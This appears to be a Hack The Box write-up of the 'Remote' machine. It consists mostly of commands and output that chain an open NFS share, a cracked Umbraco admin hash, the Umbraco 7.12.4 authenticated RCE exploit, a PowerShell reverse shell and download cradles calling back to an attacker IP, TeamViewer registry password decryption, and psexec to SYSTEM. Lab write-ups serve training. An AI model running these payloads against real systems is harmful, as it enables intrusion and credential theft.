# remote: https://app.hackthebox.com/machines/Remote

```bash
sudo nmap -sC -sV 10.10.10.180 -Pn

PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-13T14:20:49
|_  start_date: N/A
```

```bash
showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

```bash
mkdir site_backups
sudo mount -t nfs 10.10.10.180:/site_backups site_backups

ls -la
total 123
drwx------ 2 nobody nogroup  4096 Feb 23  2020 .
drwxr-xr-x 3 joker  joker    4096 May 17 20:02 ..
drwx------ 2 nobody nogroup    64 Feb 20  2020 App_Browsers
drwx------ 2 nobody nogroup  4096 Feb 20  2020 App_Data
drwx------ 2 nobody nogroup  4096 Feb 20  2020 App_Plugins
drwx------ 2 nobody nogroup    64 Feb 20  2020 aspnet_client
drwx------ 2 nobody nogroup 49152 Feb 20  2020 bin
drwx------ 2 nobody nogroup  8192 Feb 20  2020 Config
drwx------ 2 nobody nogroup    64 Feb 20  2020 css
-rwx------ 1 nobody nogroup   152 Nov  1  2018 default.aspx
-rwx------ 1 nobody nogroup    89 Nov  1  2018 Global.asax
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Media
drwx------ 2 nobody nogroup    64 Feb 20  2020 scripts
drwx------ 2 nobody nogroup  8192 Feb 20  2020 Umbraco
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Umbraco_Client
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Views
-rwx------ 1 nobody nogroup 28539 Feb 20  2020 Web.config
```

```bash
find ./* -iname "umbraco.sdf"
./App_Data/Umbraco.sdf
```

```bash
.
.slipped
.
strings Umbraco.sdf | grep -i admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
```

```bash
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50

cat creds      
b8be16afba8c314ad33d812f22a04991b90e2aaa

john creds --wordlist=/usr/share/wordlists/rockyou.txt
baconandcheese   (?)     
```
```bash
#visit the page and login 
http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms

username: admin@htb.local
password: baconandcheese
```

```bash
Umbraco version 7.12.4

searchsploit umbraco
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                             | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                      | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                      | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                         | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                      | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                                                | aspx/webapps/50462.txt
-------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m aspx/webapps/49488.py     
  Exploit: Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49488
     Path: /usr/share/exploitdb/exploits/aspx/webapps/49488.py
```

```bash
python 49488.py                                             
usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]
exploit.py: error: the following arguments are required: -u/--user, -p/--password, -i/--host, -c/--command

python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c whoami 
iis apppool\defaultapppool
```

```bash
cp /opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .

cat Invoke-PowerShellTcpOneLine.ps1                                

$client = New-Object System.Net.Sockets.TCPClient('10.10.16.2',9090);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```

```bash
python -m http.server 9998
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...
```

```bash
nc -lvnp 9090                        
listening on [any] 9090 ...
```

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2:9998/Invoke-PowerShellTcp.ps1')
```

```bash
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2:9998/Invoke-PowerShellTcp.ps1')"  

python -m http.server 9998
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...
10.10.10.180 - - [22/May/1881 20:58:36] "GET /Invoke-/Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

```bash
nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.180] 49716
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 
```

```bash
PS C:\users\Public> type user.txt
7a404186c5b165f35d58741e590aad39

```

```bash
PS C:\windows\system32\inetsrv> Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Parent              Name                                        LastWriteTime        
------              ----                                        -------------        
.
.snipped
.
Program Files (x86) TeamViewer                                  2/20/2020 2:14:58 AM 
.
.snipped
.
```

```bash
PS C:\Program Files (x86)\TeamViewer\Version7> dir

    Directory: C:\Program Files (x86)\TeamViewer\Version7

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/20/2020   2:14 AM                x64                                                                   
-a----         8/7/2012   6:36 AM           8485 CopyRights.txt                                                        
-a----        9/12/2012   7:36 AM          29920 License.txt                                                           
-a----        5/29/2015   1:17 PM        8034096 TeamViewer.exe                                                        
-a----        5/17/2023   5:02 PM         497020 TeamViewer7_Logfile.log                                               
-a----        2/27/2020  10:35 AM        1049114 TeamViewer7_Logfile_OLD.log                                           
-a----        5/29/2015   1:17 PM        2286896 TeamViewer_Desktop.exe                                                
.
.snipped
.      
-a----        5/29/2015   1:17 PM        2869040 TeamViewer_Service.exe                                                
-a----        5/29/2015   1:17 PM        2589488 TeamViewer_StaticRes.dll                                              
-a----        2/20/2020   2:14 AM             47 tvinfo.ini                                                            
-a----        5/29/2015   1:10 PM          68400 tv_w32.dll                                                            
-a----        5/29/2015   1:10 PM         106800 tv_w32.exe                                                            
-a----        5/29/2015   1:10 PM          82224 tv_x64.dll                                                            
-a----        5/29/2015   1:10 PM         129840 tv_x64.exe                                                            
-a----        5/29/2015   2:01 PM         612264 uninstall.exe            
```

```bash
wget https://raw.githubusercontent.com/mr-r3b00t/CVE-2019-18988/master/manual_exploit.bat   
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1148 (1.1K) [text/plain]
Saving to: ‘manual_exploit.bat’
```

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2:9998/manual_exploit.bat')

powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.2:9998/manual_exploit.bat', 'C:\windows\temp\manual_exploit.bat')"
```

```
C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056B94128
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x6250227f
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3
```

```bash
https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0602000000a400005253413100040000'%7D,%7B'option':'Hex','string':'0100010067244F436E6762F25EA8D704'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=RkY5QjFDNzNENjZCQ0UzMUFDNDEzRUFFMTMxQjQ2NEY1ODJGNkNFMkQxRTFGM0RBN0U4RDM3NkIyNjM5NEU1Qgo

!R3m0te!
```

```bash
impacket-psexec administrator@10.10.10.180
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file bknTcHoS.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service XxDq on 10.10.10.180.....
[*] Starting service XxDq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```bash
C:\Users\Administrator\Desktop> type root.txt
e5a3cdcb44eca123d2216949dd143ffc
```
***References*** <br>
<https://gchq.github.io/CyberChef/><br>
<https://www.revshells.com/><br>
